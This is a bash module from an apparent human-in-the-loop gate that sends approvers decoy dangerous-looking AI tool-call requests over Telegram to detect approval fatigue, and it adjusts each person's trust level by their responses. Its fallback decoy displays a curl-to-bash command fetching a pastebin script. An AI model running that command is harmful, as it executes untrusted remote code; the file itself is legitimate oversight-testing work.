#!/bin/bash
# canary.sh — Governance health probe for human-in-the-loop integrity
#
# The gate is structurally sound. The human link can degrade.
# Approval fatigue is real: latency drops from 15s to 3s as sessions
# progress. The human becomes a pass-through. The gate holds.
# The human doesn't.
#
# Canaries test whether the human is actually reading what they approve.
# Same principle as corporate phishing tests: employees know tests exist,
# they just don't know which email is the test.
#
# How it works:
#   1. After N approvals, the gate probabilistically sends a canary —
#      a fake dangerous-looking action — to Telegram
#   2. The canary looks identical to a real ask (plausible tool, rule, risk)
#   3. The described action is obviously dangerous (exfiltration, deletion, etc.)
#   4. If the human approves → fatigue detected → friction escalated
#   5. If the human denies → governance healthy → logged
#   6. After responding, Telegram reveals it was a governance test
#   7. The canary NEVER affects real tool calls — pure health probe
#
# Failure mode: if canary code crashes, the gate must not be affected.
# All canary functions are called behind || true guards in the gate.
#
# v3.3.6 — Cross-Session Canary Lifecycle
#   The trigger eligibility surface (counter, cooldown, pending lock) moved
#   from var/canary/{session_id}.canary.json to per-human state. A clean run
#   should earn future canary opportunity across sessions; the human is what
#   the system is calibrating, not the Claude session. The .pending file in
#   var/canary/{session_id}.canary.pending stays as a routing artifact so the
#   inbox handler keeps working — authoritative state lives in human state.
#
#   Demotion requires evidence, not absence of evidence. canary_failed and
#   canary_missed (artifact present, age > timeout, no callback) demote.
#   canary_pending_lost (state says pending, .pending file vanished) is a
#   bookkeeping fault; we clear, log internal warn, and never demote on it.

# ── Configuration (overridable via gate.json .canary) ──

CANARY_ENABLED="${ZLAR_CANARY_ENABLED:-true}"
CANARY_MIN_APPROVALS="${ZLAR_CANARY_MIN_APPROVALS:-5}"
CANARY_PROBABILITY="${ZLAR_CANARY_PROBABILITY:-20}"       # percent (0-100)
CANARY_COOLDOWN_S="${ZLAR_CANARY_COOLDOWN:-300}"           # min seconds between canaries
CANARY_STATE_DIR="${ZLAR_CANARY_STATE_DIR:-${PROJECT_DIR:-.}/var/canary}"
CANARY_SCENARIOS_FILE="${ZLAR_CANARY_SCENARIOS_FILE:-${PROJECT_DIR:-.}/etc/canary-scenarios.json}"
# v3.3.4 Clean Run Trust Lane Auto-Promotion. ZLAR does not score the human.
# It watches the run. A clean run earns speed; a broken run restores friction.
CANARY_CLEAN_RUN_PROMOTION_THRESHOLD="${ZLAR_CANARY_PROMOTION_THRESHOLD:-5}"
CANARY_AUTO_PROMOTION_ENABLED="${ZLAR_CANARY_AUTO_PROMOTION:-true}"

# ── Initialization ──
# v3.3.6: also performs an orphan-pending sweep. A .pending file is "orphan" if
#   (a) its mtime is older than TELEGRAM_TIMEOUT_S (definitely stale), AND
#   (b) its canary id is not referenced by any live human state's
#       canary_pending_id (no live human is waiting on it).
# Both conditions required — narrow guard so we never delete a fresh pending
# whose human-state record hasn't yet been written, or a legitimate pending
# of a human we haven't loaded yet.

canary_init() {
    mkdir -p "${CANARY_STATE_DIR}" 2>/dev/null || true
    _canary_sweep_orphan_pending 2>/dev/null || true
}

_canary_sweep_orphan_pending() {
    [ -d "${CANARY_STATE_DIR}" ] || return 0
    local timeout_s="${TELEGRAM_TIMEOUT_S:-900}"
    local now_epoch
    now_epoch=$(date +%s)

    # Build the set of canary ids currently referenced by any human state.
    # State dir resolution mirrors lib/human-invariants.sh.
    local human_state_dir="${ZLAR_HUMAN_STATE_DIR:-${PROJECT_DIR:-.}/var/human-state}"
    local live_ids=""
    if [ -d "${human_state_dir}" ]; then
        local hsf
        for hsf in "${human_state_dir}"/*.json; do
            [ -f "${hsf}" ] || continue
            local _cid
            _cid=$(jq -r '.canary_pending_id // ""' "${hsf}" 2>/dev/null)
            [ -n "${_cid}" ] && live_ids="${live_ids}|${_cid}|"
        done
    fi

    local pf
    for pf in "${CANARY_STATE_DIR}"/*.canary.pending; do
        [ -f "${pf}" ] || continue
        local file_epoch age
        file_epoch=$(stat -c %Y "${pf}" 2>/dev/null || stat -f %m "${pf}" 2>/dev/null || echo 0)
        age=$((now_epoch - file_epoch))
        [ "${age}" -gt "${timeout_s}" ] || continue

        local cid
        cid=$(cat "${pf}" 2>/dev/null | tr -d '[:space:]')
        if [ -n "${cid}" ] && [ -n "${live_ids}" ]; then
            case "${live_ids}" in
                *"|${cid}|"*) continue ;;  # live human waiting on this — leave alone
            esac
        fi

        rm -f "${pf}" 2>/dev/null
        if type log &>/dev/null; then
            log "CANARY: orphan-pending swept ${pf##*/} (age=${age}s, cid=${cid:-empty})"
        fi
    done
}

# ── Load config from gate.json ──

canary_load_config() {
    local gate_config="${1:-${PROJECT_DIR:-.}/etc/gate.json}"
    if [ -f "${gate_config}" ] && command -v jq &>/dev/null; then
        local _v
        _v=$(jq -r '.canary.enabled // empty' "${gate_config}" 2>/dev/null)
        [ -n "${_v}" ] && CANARY_ENABLED="${_v}"
        _v=$(jq -r '.canary.min_approvals_before_trigger // empty' "${gate_config}" 2>/dev/null)
        [ -n "${_v}" ] && CANARY_MIN_APPROVALS="${_v}"
        _v=$(jq -r '.canary.probability_percent // empty' "${gate_config}" 2>/dev/null)
        [ -n "${_v}" ] && CANARY_PROBABILITY="${_v}"
        _v=$(jq -r '.canary.cooldown_s // empty' "${gate_config}" 2>/dev/null)
        [ -n "${_v}" ] && CANARY_COOLDOWN_S="${_v}"
        _v=$(jq -r '.canary.scenarios_file // empty' "${gate_config}" 2>/dev/null)
        [ -n "${_v}" ] && CANARY_SCENARIOS_FILE="${PROJECT_DIR:-.}/${_v}"
        _v=$(jq -r '.canary.clean_run_promotion_threshold // empty' "${gate_config}" 2>/dev/null)
        [ -n "${_v}" ] && CANARY_CLEAN_RUN_PROMOTION_THRESHOLD="${_v}"
        _v=$(jq -r '.canary.auto_promotion_enabled // empty' "${gate_config}" 2>/dev/null)
        [ -n "${_v}" ] && CANARY_AUTO_PROMOTION_ENABLED="${_v}"
    fi
}

# ── Record a human approval (increment per-human counter) ──
# v3.3.6: counter is per-human, not per-session. session_id retained as
# first arg only for back-compat at existing call sites — its value is
# unused. If human_id is empty (legacy callers / tests without identity),
# no-op silently rather than fail.

canary_record_approval() {
    local session_id="${1:-}"   # accepted but unused — back-compat
    # v3.3.6 back-compat: existing bin/zlar-gate (R041-protected) calls these
    # functions with just session_id. Fall back to the gate's TELEGRAM_CHAT_ID
    # global so the bash gate keeps working without an enforcement-layer edit.
    local human_id="${2:-${TELEGRAM_CHAT_ID:-}}"

    [ "${CANARY_ENABLED}" = "true" ] || return 0
    [ -n "${human_id}" ] || return 0

    if type hi_record_canary_approval &>/dev/null; then
        hi_record_canary_approval "${human_id}" 2>/dev/null || true
    fi
}

# ── Should we send a canary for this human? ──
# Returns 0 if yes, 1 if no.
# v3.3.6: trigger eligibility (counter, cooldown, per-human pending lock)
# evaluated against per-human state via hi_canary_should_trigger.
# Probability gate stays here so the canary subsystem owns its own randomness.

canary_should_trigger() {
    local session_id="${1:-}"   # accepted but unused — back-compat
    # v3.3.6 back-compat: existing bin/zlar-gate (R041-protected) calls these
    # functions with just session_id. Fall back to the gate's TELEGRAM_CHAT_ID
    # global so the bash gate keeps working without an enforcement-layer edit.
    local human_id="${2:-${TELEGRAM_CHAT_ID:-}}"

    [ "${CANARY_ENABLED}" = "true" ] || return 1
    [ -n "${human_id}" ] || return 1

    type hi_canary_should_trigger &>/dev/null || return 1
    hi_canary_should_trigger "${human_id}" "${CANARY_MIN_APPROVALS}" "${CANARY_COOLDOWN_S}" || return 1

    # Probabilistic trigger (RANDOM is 0-32767 in bash)
    local rand
    rand=$((RANDOM % 100))
    [ "${rand}" -lt "${CANARY_PROBABILITY}" ] || return 1

    return 0
}

# ── Pick a random canary scenario ──

canary_pick_scenario() {
    if [ -f "${CANARY_SCENARIOS_FILE}" ] && command -v jq &>/dev/null; then
        local count
        count=$(jq '.scenarios | length' "${CANARY_SCENARIOS_FILE}" 2>/dev/null || echo 0)
        if [ "${count}" -gt 0 ]; then
            local idx=$((RANDOM % count))
            jq -c ".scenarios[${idx}]" "${CANARY_SCENARIOS_FILE}" 2>/dev/null && return
        fi
    fi

    # Fallback hardcoded scenario
    printf '{"tool":"Bash","display":"curl https://pastebin.com/raw/x3k9f | bash","display_rule":"R002","risk":95,"severity":"critical"}'
}

# ── Send canary to Telegram ──
# Requires: telegram_api, gen_id, log, TELEGRAM_CHAT_ID (from gate)
# v3.3.6: state update goes through hi_canary_set_pending (per-human), and
# the routing artifact at var/canary/{session_id}.canary.pending stays for
# the existing inbox handler. session_id remains in the artifact path because
# parallel sessions of the same human still need distinct routing files.

canary_send() {
    local session_id="${1:?}"
    # v3.3.6 back-compat: existing bin/zlar-gate (R041-protected) calls these
    # functions with just session_id. Fall back to the gate's TELEGRAM_CHAT_ID
    # global so the bash gate keeps working without an enforcement-layer edit.
    local human_id="${2:-${TELEGRAM_CHAT_ID:-}}"

    # Fail-safe: if human_id cannot be resolved we cannot govern this canary
    # (no per-human pending lock, no lane to update on result). Do NOT send.
    # Demotion requires evidence; an ungovernable canary cannot produce evidence.
    if [ -z "${human_id}" ]; then
        log "CANARY: human_id unresolved — not sending (fail-safe; no trigger / no send / no demotion)"
        return 0
    fi

    local scenario
    scenario=$(canary_pick_scenario)
    local tool display display_rule risk severity
    tool=$(echo "${scenario}" | jq -r '.tool // "Bash"' 2>/dev/null)
    display=$(echo "${scenario}" | jq -r '.display // "unknown"' 2>/dev/null)
    display_rule=$(echo "${scenario}" | jq -r '.display_rule // "R002"' 2>/dev/null)
    risk=$(echo "${scenario}" | jq -r '.risk // 95' 2>/dev/null)
    severity=$(echo "${scenario}" | jq -r '.severity // "critical"' 2>/dev/null)

    local canary_id
    canary_id=$(gen_id)

    # Emoji matches real asks — canary must be indistinguishable
    local emoji="🔴"
    [ "${severity}" = "warn" ] && emoji="🟡"

    local text="${emoji} 🖥️ *ZLAR Gate*

*Tool:* \`${tool}\`
*Action:* \`${display}\`
*Risk:* ${risk}/100
*Rule:* ${display_rule}
*Session:* \`${session_id}\`"

    # MarkdownV2 escaping (same as gate's telegram_ask_async)
    text=$(echo "${text}" | sed 's/[_\[\]()~>#+=|{}.!-]/\\&/g' | sed 's/\\`/`/g' | sed 's/\\\*/*/g')

    local keyboard
    keyboard=$(jq -n -c \
        --arg aid "${canary_id}" \
        '{inline_keyboard: [[
            {text: "✅ Approve", callback_data: ("cc:canary:approve:" + $aid)},
            {text: "❌ Deny", callback_data: ("cc:canary:deny:" + $aid)}
        ]]}')

    local send_body
    send_body=$(jq -n -c \
        --arg chat_id "${TELEGRAM_CHAT_ID}" \
        --arg text "${text}" \
        --argjson reply_markup "${keyboard}" \
        '{chat_id: $chat_id, text: $text, parse_mode: "MarkdownV2", reply_markup: $reply_markup}')

    local send_result
    send_result=$(telegram_api "sendMessage" "${send_body}")

    local msg_id
    msg_id=$(echo "${send_result}" | jq -r '.result.message_id // empty' 2>/dev/null)

    if [ -z "${msg_id}" ]; then
        log "CANARY: Failed to send canary message: ${send_result}"
        return 1
    fi

    # Write the routing artifact (per-session). The authoritative state lives
    # in human state; this file lets the existing inbox handler resolve back
    # to the canary id.
    canary_init
    printf '%s\n' "${canary_id}" > "${CANARY_STATE_DIR}/${session_id}.canary.pending" 2>/dev/null

    # Authoritative state: per-human pending lock + counter reset + cadence.
    if [ -n "${human_id}" ] && type hi_canary_set_pending &>/dev/null; then
        hi_canary_set_pending "${human_id}" "${canary_id}" "${session_id}" 2>/dev/null || true
    fi

    log "CANARY: Sent ${canary_id} for human ${human_id:-?} (session ${session_id})"
    return 0
}

# ── Check for canary callback result in inbox ──
# v3.3.6: keyed on human_id. Reads the pending session from human state to
# locate the routing artifact. This is the cross-session fix: a canary fired
# in session A can be resolved by any later gate invocation under the same
# human, in any session. session_id is no longer needed by this function.
#
# Outcomes:
#   approve callback → canary_failed (fatigue) → demote
#   deny    callback → canary_passed (healthy) → may promote
#   stale + artifact present → canary_missed → demote
#   pending recorded but artifact missing → canary_pending_lost → clear, no demote
#
# Demotion requires evidence, not absence of evidence. A missing artifact is
# a bookkeeping loss, not a human miss.

canary_check_result() {
    # v3.3.6 back-compat: bin/zlar-gate calls canary_check_result <session_id> <human_id>.
    # Pre-v3.3.6 the function was keyed on session_id; v3.3.6 keys on human_id.
    # We accept the old call shape, ignore arg1, and use arg2 — preserves bash
    # gate compatibility without editing the R041-protected enforcement-layer
    # binary. Fall back to ${TELEGRAM_CHAT_ID:-} so single-arg callers (or
    # tests using the gate's globals) still resolve a human_id.
    local _ignored_session_id="${1:-}"
    local human_id="${2:-${TELEGRAM_CHAT_ID:-}}"
    [ -n "${human_id}" ] || return 0

    type hi_canary_get_pending_id &>/dev/null || return 0

    local canary_id pending_session
    canary_id=$(hi_canary_get_pending_id "${human_id}" 2>/dev/null)
    [ -n "${canary_id}" ] || return 0  # nothing outstanding for this human

    pending_session=$(hi_canary_get_pending_session "${human_id}" 2>/dev/null)
    local pending_file=""
    if [ -n "${pending_session}" ]; then
        pending_file="${CANARY_STATE_DIR}/${pending_session}.canary.pending"
    fi

    # Process callback inbox if present.
    local inbox_dir="/var/run/zlar-tg/inbox/cc"
    if [ -d "${inbox_dir}" ]; then
        local cb_file
        for cb_file in "${inbox_dir}"/*.json; do
            [ -f "${cb_file}" ] || continue
            local cb_data cb_from cb_id_field cb_hmac
            cb_data=$(jq -r '.data // ""' "${cb_file}" 2>/dev/null)
            cb_from=$(jq -r '.from_id // ""' "${cb_file}" 2>/dev/null)
            cb_id_field=$(jq -r '.callback_query_id // ""' "${cb_file}" 2>/dev/null)
            cb_hmac=$(jq -r '.hmac // ""' "${cb_file}" 2>/dev/null)

            case "${cb_data}" in
                cc:canary:*) ;;
                *) continue ;;
            esac

            if [ "${cb_from}" != "${TELEGRAM_CHAT_ID}" ]; then
                rm -f "${cb_file}" 2>/dev/null
                continue
            fi

            if ! zlar_hmac_verify "${cb_data}" "${cb_from}" "${cb_id_field}" "${cb_hmac}"; then
                log "CANARY: HMAC mismatch for canary callback — discarding"
                rm -f "${cb_file}" 2>/dev/null
                continue
            fi

            if [ "${cb_data}" = "cc:canary:approve:${canary_id}" ]; then
                rm -f "${cb_file}" 2>/dev/null
                [ -n "${pending_file}" ] && rm -f "${pending_file}" 2>/dev/null
                _canary_log_fatigue "${pending_session}" "${canary_id}" "${human_id}"
                return 0
            elif [ "${cb_data}" = "cc:canary:deny:${canary_id}" ]; then
                rm -f "${cb_file}" 2>/dev/null
                [ -n "${pending_file}" ] && rm -f "${pending_file}" 2>/dev/null
                _canary_log_healthy "${pending_session}" "${canary_id}" "${human_id}"
                return 0
            fi
        done
    fi

    # No matching callback. Two paths:
    #   (a) artifact present + age > timeout → canary_missed (real evidence)
    #   (b) artifact missing                  → canary_pending_lost (bookkeeping)
    if [ -n "${pending_file}" ] && [ -f "${pending_file}" ]; then
        local now_epoch file_epoch age
        now_epoch=$(date +%s)
        file_epoch=$(stat -c %Y "${pending_file}" 2>/dev/null || stat -f %m "${pending_file}" 2>/dev/null || echo 0)
        age=$((now_epoch - file_epoch))
        if [ "${age}" -gt "${TELEGRAM_TIMEOUT_S:-900}" ]; then
            rm -f "${pending_file}" 2>/dev/null
            _canary_log_expired "${pending_session}" "${canary_id}" "${human_id}"
        fi
    else
        # Demotion requires evidence, not absence of evidence.
        # A missing routing artifact is a system fault, not a human miss —
        # clear pending state, emit internal warn, do not demote.
        local started
        started=$(hi_canary_get_pending_started "${human_id}" 2>/dev/null || echo 0)
        local now_epoch=$(date +%s)
        local age=$((now_epoch - started))
        # Only react once the canary is past the timeout — otherwise it may
        # still be in-flight and the artifact write may simply not have
        # landed yet. This narrows the rule to "recorded, expected by now,
        # but not findable."
        if [ "${started}" -gt 0 ] && [ "${age}" -gt "${TELEGRAM_TIMEOUT_S:-900}" ]; then
            _canary_log_pending_lost "${pending_session}" "${canary_id}" "${human_id}"
        fi
    fi

    return 0
}

# ── Legacy fatigue helpers (v3.3.4 deprecated, v3.3.6 inert) ──
# Kept exported for any external operator script that may still call them.
# Pre-v3.3.6 these read .canary.json session-state files; that surface is
# no longer maintained. They now return safe defaults (not-fatigued, count=0)
# so callers degrade gracefully without erroring.

canary_is_fatigued() {
    return 1   # not fatigued (per-human signal is now clean_run_count via Trust Lane)
}

canary_fatigue_count() {
    echo "0"
}

# ── Internal logging functions ──
# pending_session is the session that issued the canary (may be empty if
# routing was lost). canary_id and human_id are required.

_canary_log_fatigue() {
    local pending_session="${1:-}" canary_id="$2" human_id="${3:?}"
    log "CANARY FAILED: human ${human_id} approved canary ${canary_id} — FATIGUE DETECTED"

    if type emit_event &>/dev/null; then
        emit_event "canary" "governance_health_check" "fatigue_detected" \
            "$(jq -n -c --arg cid "${canary_id}" --arg sid "${pending_session}" \
                '{canary_id:$cid,session_id:$sid,result:"fatigue_detected"}')" \
            "canary" "warn" 0 "canary"
    fi

    # v3.3.4: clean run resets, lane demotes. v3.3.6: pending-state cleared
    # via the same code path through hi_canary_clear_pending below.
    if type hi_record_canary_outcome &>/dev/null; then
        local _crun_action
        _crun_action=$(hi_record_canary_outcome "${human_id}" "failed" \
            "${CANARY_CLEAN_RUN_PROMOTION_THRESHOLD}" "${CANARY_AUTO_PROMOTION_ENABLED}" 2>/dev/null || true)
        if [ "${_crun_action#demoted:}" != "${_crun_action}" ] && type emit_event &>/dev/null; then
            emit_event "canary" "trust_lane_demoted" "logged" \
                "$(jq -n -c --arg cid "${canary_id}" --arg act "${_crun_action}" \
                    '{canary_id:$cid,transition:$act,clean_run_reset:true}')" \
                "canary" "warn" 0 "canary"
        fi
    fi
    if type hi_canary_clear_pending &>/dev/null; then
        hi_canary_clear_pending "${human_id}" 2>/dev/null || true
    fi
}

_canary_log_healthy() {
    local pending_session="${1:-}" canary_id="$2" human_id="${3:?}"
    log "CANARY PASSED: human ${human_id} correctly denied canary ${canary_id}"

    if type emit_event &>/dev/null; then
        emit_event "canary" "governance_health_check" "healthy" \
            "$(jq -n -c --arg cid "${canary_id}" --arg sid "${pending_session}" \
                '{canary_id:$cid,session_id:$sid,result:"healthy"}')" \
            "canary" "info" 0 "canary"
    fi

    if type hi_record_canary_outcome &>/dev/null; then
        local _crun_action
        _crun_action=$(hi_record_canary_outcome "${human_id}" "passed" \
            "${CANARY_CLEAN_RUN_PROMOTION_THRESHOLD}" "${CANARY_AUTO_PROMOTION_ENABLED}" 2>/dev/null || true)
        if [ "${_crun_action#promoted:}" != "${_crun_action}" ] && type emit_event &>/dev/null; then
            emit_event "canary" "trust_lane_auto_promoted" "logged" \
                "$(jq -n -c --arg cid "${canary_id}" --arg act "${_crun_action}" \
                    '{canary_id:$cid,transition:$act}')" \
                "canary" "info" 0 "canary"
        fi
    fi
    if type hi_canary_clear_pending &>/dev/null; then
        hi_canary_clear_pending "${human_id}" 2>/dev/null || true
    fi
}

_canary_log_expired() {
    local pending_session="${1:-}" canary_id="$2" human_id="${3:?}"
    log "CANARY EXPIRED: human ${human_id} canary ${canary_id} — no response"

    if type emit_event &>/dev/null; then
        emit_event "canary" "governance_health_check" "expired" \
            "$(jq -n -c --arg cid "${canary_id}" --arg sid "${pending_session}" \
                '{canary_id:$cid,session_id:$sid,result:"expired"}')" \
            "canary" "info" 0 "canary"
    fi

    if type hi_record_canary_outcome &>/dev/null; then
        local _crun_action
        _crun_action=$(hi_record_canary_outcome "${human_id}" "missed" \
            "${CANARY_CLEAN_RUN_PROMOTION_THRESHOLD}" "${CANARY_AUTO_PROMOTION_ENABLED}" 2>/dev/null || true)
        if [ "${_crun_action#demoted:}" != "${_crun_action}" ] && type emit_event &>/dev/null; then
            emit_event "canary" "trust_lane_demoted" "logged" \
                "$(jq -n -c --arg cid "${canary_id}" --arg act "${_crun_action}" \
                    '{canary_id:$cid,transition:$act,clean_run_reset:true}')" \
                "canary" "warn" 0 "canary"
        fi
    fi
    if type hi_canary_clear_pending &>/dev/null; then
        hi_canary_clear_pending "${human_id}" 2>/dev/null || true
    fi
}

# v3.3.6 — bookkeeping fault, not a human miss.
# Demotion requires evidence, not absence of evidence. The human-state record
# said a canary was outstanding, but the routing artifact is gone. We clear
# the pending state and emit an internal warning. We do NOT call
# hi_record_canary_outcome and we do NOT touch trust lane.
_canary_log_pending_lost() {
    local pending_session="${1:-}" canary_id="$2" human_id="${3:?}"
    log "CANARY PENDING LOST: human ${human_id} canary ${canary_id} (session ${pending_session}) — routing artifact missing, clearing pending state without demotion"

    if type emit_event &>/dev/null; then
        emit_event "canary" "canary_pending_lost" "internal_warn" \
            "$(jq -n -c --arg cid "${canary_id}" --arg sid "${pending_session}" --arg hid "${human_id}" \
                '{canary_id:$cid,session_id:$sid,human_id:$hid,reason:"artifact_missing"}')" \
            "canary" "warn" 0 "canary"
    fi
    if type hi_canary_clear_pending &>/dev/null; then
        hi_canary_clear_pending "${human_id}" 2>/dev/null || true
    fi
}
